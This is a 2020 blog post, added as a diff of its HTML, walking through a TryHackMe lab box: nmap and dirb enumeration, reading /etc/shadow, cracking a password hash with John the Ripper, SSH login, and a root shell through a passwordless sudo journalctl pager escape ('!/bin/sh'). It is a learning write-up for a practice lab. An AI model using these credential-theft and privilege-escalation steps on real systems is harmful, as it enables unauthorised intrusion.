@@ -1,0 +1,510 @@
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Local file inclusion | write-up</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css?v=8ef14f4f44">
+
+    <link rel="shortcut icon" href="../favicon.png" type="image/png">
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <link rel="amphtml" href="amp/index.html">
+    
+    <meta property="og:site_name" content="fr33s0ul">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Local file inclusion | write-up">
+    <meta property="og:description" content="Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called falconfeast feel free to visit his room. TryHackMe | Hacking TrainingAn online platform for learning and teaching cyber security, all through your browser.TryHackMeEnumeration root@kali:">
+    <meta property="og:url" content="https://fr33s0ul.tech/lfi/">
+    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/653aa50b92574882f.png">
+    <meta property="article:published_time" content="2020-04-17T19:48:26.000Z">
+    <meta property="article:modified_time" content="2020-04-17T19:51:54.000Z">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Local file inclusion | write-up">
+    <meta name="twitter:description" content="Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called falconfeast feel free to visit his room. TryHackMe | Hacking TrainingAn online platform for learning and teaching cyber security, all through your browser.TryHackMeEnumeration root@kali:">
+    <meta name="twitter:url" content="https://fr33s0ul.tech/lfi/">
+    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/653aa50b92574882f.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="fr33s0ul">
+    <meta name="twitter:site" content="@fr33soul_">
+    <meta name="twitter:creator" content="@fr33soul_">
+    <meta property="og:image:width" content="709">
+    <meta property="og:image:height" content="402">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "fr33s0ul",
+        "url": "https://fr33s0ul.tech/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": {
+                "@type": "ImageObject",
+                "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
+                "width": 300,
+                "height": 41
+            }
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "fr33s0ul",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
+            "width": 600,
+            "height": 594
+        },
+        "url": "https://fr33s0ul.tech/author/fr33s0ul/",
+        "sameAs": [
+            "https://twitter.com/fr33soul_"
+        ]
+    },
+    "headline": "Local file inclusion | write-up",
+    "url": "https://fr33s0ul.tech/lfi/",
+    "datePublished": "2020-04-17T19:48:26.000Z",
+    "dateModified": "2020-04-17T19:51:54.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/653aa50b92574882f.png",
+        "width": 709,
+        "height": 402
+    },
+    "description": "Hello everyone, here&#x27;s a quick write-up about LFI that I really recommend for\npeople just starting in the field. It&#x27;s created by a user called falconfeast\n[https://tryhackme.com/p/falconfeast] feel free to visit his room.\n\nTryHackMe | Hacking TrainingAn online platform for learning and teaching cyber\nsecurity, all through your browser.TryHackMe [https://tryhackme.com]&gt; Enumeration \nroot@kali:~# nmap -sC -sV 10.10.104.39\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 19:00 UTC\nNmap scan re",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://fr33s0ul.tech/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.13">
+    <link rel="alternate" type="application/rss+xml" title="fr33s0ul" href="../rss/index.html">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-111725042-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-111725042-2');
+</script>
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header">
+    <div class="outer site-nav-main">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left-wrapper">
+        <div class="site-nav-left">
+                <a class="site-nav-logo" href="../"><img src="../content/images/size/w1000/2020/03/logo.gif" alt="fr33s0ul"></a>
+            <div class="site-nav-content">
+                    <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="../">Home</a></li>
+    <li class="nav-whoami" role="menuitem"><a href="../whoami/">whoami</a></li>
+</ul>
+
+                    <span class="nav-post-title ">Local file inclusion | write-up</span>
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+            <div class="social-links">
+                    <a class="social-link social-link-tw" href="https://twitter.com/fr33soul_" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+</a>
+            </div>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://fr33s0ul.tech/rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
+</a>
+
+    </div>
+</nav>
+    </div>
+</div></header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post ">
+
+            <header class="post-full-header">
+
+
+                <h1 class="post-full-title">Local file inclusion | write-up</h1>
+
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                                    <div class="author-info">
+                                        <h2>fr33s0ul</h2>
+                                        <p>Read <a href="../author/fr33s0ul/">more posts</a> by this author.</p>
+                                    </div>
+                                </div>
+
+                                <a href="../author/fr33s0ul/" class="author-avatar">
+                                    <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="../author/fr33s0ul/">fr33s0ul</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2020-04-17">17 Apr 2020</time>
+                                <span class="byline-reading-time"><span class="bull">•</span> 6 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+            <figure class="post-full-image">
+                <img srcset="../content/images/size/w300/2020/04/653aa50b92574882f.png 300w,
+                           ../content/images/size/w600/2020/04/653aa50b92574882f.png 600w,
+                          ../content/images/size/w1000/2020/04/653aa50b92574882f. png 1000w,
+                         ../content/images/size/w2000/2020/04/653aa50b92574882f. png 2000w" sizes="(max-width: 800px) 400px,
+                        (max-width: 1170px) 1170px,
+                            2000px" src="../content/images/size/w2000/2020/04/653aa50b92574882f.png" alt="Local file inclusion | write-up">
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p>Hello everyone, here's a quick write-up about LFI that I really recommend for people just starting in the field. It's created by a user called <a href="https://tryhackme.com/p/falconfeast"><strong>falconfeast</strong></a><strong> </strong>feel free to visit his room.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | Hacking Training</div><div class="kg-bookmark-description">An online platform for learning and teaching cyber security, all through your browser.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png"><span class="kg-bookmark-publisher">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme.com/img/favicon.png"></div></a></figure><blockquote>Enumeration </blockquote><pre><code>root@kali:~# nmap -sC -sV 10.10.104.39
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-17 19:00 UTC
+Nmap scan report for ip-10-10-104-39.eu-west-1.compute.internal (10.10.104.39)
+Host is up (0.00079s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:b9:f0:d3:e4:b3:17:9c:7f:b6:7d:28:72:8a:e4:77 (RSA)
+|   256 07:f2:d9:85:77:74:52:2a:73:76:70:35:73:70:c3:9e (ECDSA)
+|_  256 23:ba:e8:b6:8b:a2:ac:58:3b:f4:04:dc:6e:36:b7:f2 (ED25519)
+80/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.6.9)
+|_http-title: Shop
+MAC Address: 02:24:A4:61:CD:74 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.74 seconds
+root@kali:~#</code></pre><pre><code>root@kali:~# dirb http://10.10.104.39
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Apr 17 19:23:58 2020
+URL_BASE: http://10.10.104.39/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.104.39/ ----
++ http://10.10.104.39/home (CODE:200|SIZE:4116)                                    
+                                                                                   
+-----------------
+END_TIME: Fri Apr 17 19:25:08 2020
+DOWNLOADED: 4612 - FOUND: 1
+root@kali:~#</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-17-at-20.08.52.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-17-at-20.42.18.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-17-at-20.10.15.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/sc.png" class="kg-image"></figure><p>I next tried to see if the user falcon have access to <strong>/etc/shadow </strong>and yes ... </p><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/rlL4XHR60GPew" width="480" height="341" frameborder="0" class="giphy-embed" allowfullscreen></iframe><p><a href="https://giphy.com/gifs/transparent-rlL4XHR60GPew"></a></p>
+<!--kg-card-end: html--><p>Let's decrypt the hash and see if we have any luck on this one</p><pre><code>root@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xxxxxxxxxx       (falcon)
+1g 0:00:00:07 DONE (2020-04-17 19:23) 0.1254g/s 2376p/s 2376c/s 2376C/s soldado..playas
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@kali:~#</code></pre><pre><code>root@kali:~# ssh falcon@10.10.104.39
+The authenticity of host '10.10.104.39 (10.10.104.39)' can't be established.
+ECDSA key fingerprint is SHA256:K4V/ri6osqzorAUTBrYc1jiyx8Uiy22Uf1qqH6O4Iho.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes            
+Warning: Permanently added '10.10.104.39' (ECDSA) to the list of known hosts.       
+falcon@10.10.104.39's password:                                                     
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)                  
+                                                                                    
+ * Documentation:  https://help.ubuntu.com                                          
+ * Management:     https://landscape.canonical.com                                  
+ * Support:        https://ubuntu.com/advantage                                     
+                                                                                    
+  System information as of Sat Apr 18 00:54:49 IST 2020                             
+                                                                                    
+  System load:  0.72              Processes:           84                           
+  Usage of /:   31.4% of 9.78GB   Users logged in:     0                            
+  Memory usage: 16%               IP address for eth0: 10.10.104.39                 
+  Swap usage:   0%                                                                  
+                                                                                    
+                                                                                    
+6 packages can be updated.                                                          
+3 updates are security updates.                                                     
+                                                                                    
+                                                                                    
+Last login: Wed Jan 29 20:13:44 2020 from 192.168.1.107                             
+falcon@walk:~$                                                                      
+              </code></pre><p>and we are user falcon, I'm pretty sure that there's another way in so feel free to dive in.</p><figure class="kg-card kg-code-card"><pre><code>falcon@walk:~$ ls                                                                   
+user.txt                                                                            
+falcon@walk:~$ cat user.txt                                                         
+XXXXXXXXXXXXXXXXXXXX                                                                
+falcon@walk:~$ sudo -l
+Matching Defaults entries for falcon on walk:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falcon may run the following commands on walk:
+    (root) NOPASSWD: /bin/journalctl
+falcon@walk:~$</code></pre><figcaption>The user can use /bin/journalctl as root without password.</figcaption></figure><pre><code>falcon@walk:~$ sudo /bin/journalctl 
+-- Logs begin at Tue 2020-01-28 19:00:21 IST, end at Sat 2020-04-18 00:58:39 IST. --
+Jan 28 19:00:21 walk kernel: Linux version 4.15.0-20-generic (buildd@lgw01-amd64-039
+Jan 28 19:00:21 walk kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generi
+Jan 28 19:00:21 walk kernel: KERNEL supported cpus:
+Jan 28 19:00:21 walk kernel:   Intel GenuineIntel
+Jan 28 19:00:21 walk kernel:   AMD AuthenticAMD
+Jan 28 19:00:21 walk kernel:   Centaur CentaurHauls
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating 
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers
+Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers
+Jan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
+Jan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 8
+Jan 28 19:00:21 walk kernel: e820: BIOS-provided physical RAM map:
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000100000-0x000000003ffeffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000003fff0000-0x000000003fffffff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] 
+Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] 
+Jan 28 19:00:21 walk kernel: NX (Execute Disable) protection: active
+Jan 28 19:00:21 walk kernel: random: fast init done
+Jan 28 19:00:21 walk kernel: SMBIOS 2.5 present.
+Jan 28 19:00:21 walk kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBo
+Jan 28 19:00:21 walk kernel: Hypervisor detected: KVM
+Jan 28 19:00:21 walk kernel: e820: update [mem 0x00000000-0x00000fff] usable ==&gt; res
+Jan 28 19:00:21 walk kernel: e820: remove [mem 0x000a0000-0x000fffff] usable
+Jan 28 19:00:21 walk kernel: e820: last_pfn = 0x3fff0 max_arch_pfn = 0x400000000
+Jan 28 19:00:21 walk kernel: MTRR default type: uncachable
+Jan 28 19:00:21 walk kernel: MTRR variable ranges disabled:
+Jan 28 19:00:21 walk kernel: MTRR: Disabled
+Jan 28 19:00:21 walk kernel: x86/PAT: MTRRs disabled, skipping PAT initialization to
+Jan 28 19:00:21 walk kernel: CPU MTRRs all blank - virtualized system.
+Jan 28 19:00:21 walk kernel: x86/PAT: Configuration [0-7]: WB  WT  UC- UC  WB  WT  U
+Jan 28 19:00:21 walk kernel: found SMP MP-table at [mem 0x0009fff0-0x0009ffff] mappe
+Jan 28 19:00:21 walk kernel: Scanning 1 areas for low memory corruption
+Jan 28 19:00:21 walk kernel: Base memory trampoline at [        (ptrval)] 99000 size
+Jan 28 19:00:21 walk kernel: BRK [0x2493e000, 0x2493efff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x2493f000, 0x2493ffff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24940000, 0x24940fff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24941000, 0x24941fff] PGTABLE
+Jan 28 19:00:21 walk kernel: BRK [0x24942000, 0x24942fff] PGTABLE
+Jan 28 19:00:21 walk kernel: RAMDISK: [mem 0x31777000-0x34bb2fff]
+Jan 28 19:00:21 walk kernel: ACPI: Early table checksum verification disabled
+Jan 28 19:00:21 walk kernel: ACPI: RSDP 0x00000000000E0000 000024 (v02 VBOX  )
+Jan 28 19:00:21 walk kernel: ACPI: XSDT 0x000000003FFF0030 00003C (v01 VBOX   VBOXXS
+Jan 28 19:00:21 walk kernel: ACPI: FACP 0x000000003FFF00F0 0000F4 (v04 VBOX   VBOXFA
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls -la /root
+total 32
+drwx------  5 root root 4096 Jan 30 21:41 .
+drwxr-xr-x 23 root root 4096 Jan 28 19:29 ..
+lrwxrwxrwx  1 root root    9 Jan 30 21:41 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root 4096 Jan 28 23:21 .cache
+drwx------  3 root root 4096 Jan 28 19:14 .gnupg
+drwxr-xr-x  3 root root 4096 Jan 28 23:11 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   21 Jan 29 19:52 root.txt
+# 
+</code></pre><p>and we are root ! Enjoy your flags.</p><p>Happy Hacking!</p>
+                </div>
+            </section>
+
+
+<script>talkyardServerUrl='https://comments-for-fr33s0ul-tech.talkyard.net';</script>
+<script async defer src="https://c1.ty-cdn.net/-/talkyard-comments.min.js"></script>
+<!-- You can specify a per page discussion id on the next line, if your URLs might change. -->
+<div class="talkyard-comments" data-discussion-id="" style="margin-top: 45px;">
+<noscript>Please enable Javascript to view comments.</noscript>
+</div>
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+
+
+                <article class="post-card post featured ">
+
+    <a class="post-card-image-link" href="../attacktive-directory-thm-write-up/">
+        <img class="post-card-image" srcset="../content/images/size/w300/2020/04/aD.png 300w,
+                   ../content/images/size/w600/2020/04/aD.png 600w,
+                  ../content/images/size/w1000/2020/04/aD. png 1000w,
+                 ../content/images/size/w2000/2020/04/aD. png 2000w" sizes="(max-width: 1000px) 400px, 700px" loading="lazy" src="../content/images/size/w600/2020/04/aD.png" alt="Attacktive Directory | THM write-up">
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../attacktive-directory-thm-write-up/">
+
+            <header class="post-card-header">
+                <h2 class="post-card-title">Attacktive Directory | THM write-up</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called Sp00ky. in my opinion,</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        fr33s0ul
+                    </div>
+            
+                    <a href="../author/fr33s0ul/" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul">
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="../author/fr33s0ul/">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-04-17">17 Apr 2020</time> <span class="bull">•</span> 23 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="../">fr33s0ul</a> © 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="../">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/fr33soul_" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
+    </script>
+    <script src="../assets/built/casper.js?v=8ef14f4f44"></script>
+
+    <script>
+        // Parse the URL parameter
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Give the parameter a variable name
+        var action = getParameterByName('action');
+
+        $(document).ready(function () {
+            if (action == 'subscribe') {
+                $('body').addClass("subscribe-success");
+            }
+
+            $('.subscribe-success-message .subscribe-close').click(function () {
+                $('.subscribe-success-message').addClass('close');
+            });
+
+            // Reset form on opening subscrion overlay
+            $('.subscribe-button').click(function() {
+                $('.subscribe-overlay form').removeClass();
+                $('.subscribe-email').val('');
+            });
+        });
+    </script>
+
+    <script>
+    $(document).ready(function () {
+        // FitVids - start
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // FitVids - end
+
+        // Replace nav with title on scroll - start
+        Casper.stickyNavTitle({
+            navSelector: '.site-nav-main',
+            titleSelector: '.post-full-title',
+            activeClass: 'nav-post-title-active'
+        });
+        // Replace nav with title on scroll - end
+
+        // Hover on avatar
+        var hoverTimeout;
+        $('.author-list-item').hover(function () {
+            var $this = $(this);
+
+            clearTimeout(hoverTimeout);
+
+            $('.author-card').removeClass('hovered');
+            $(this).children('.author-card').addClass('hovered');
+
+        }, function () {
+            var $this = $(this);
+
+            hoverTimeout = setTimeout(function () {
+                $this.children('.author-card').removeClass('hovered');
+            }, 800);
+        });
+    });
+</script>
+
+
+    
+
+</body>
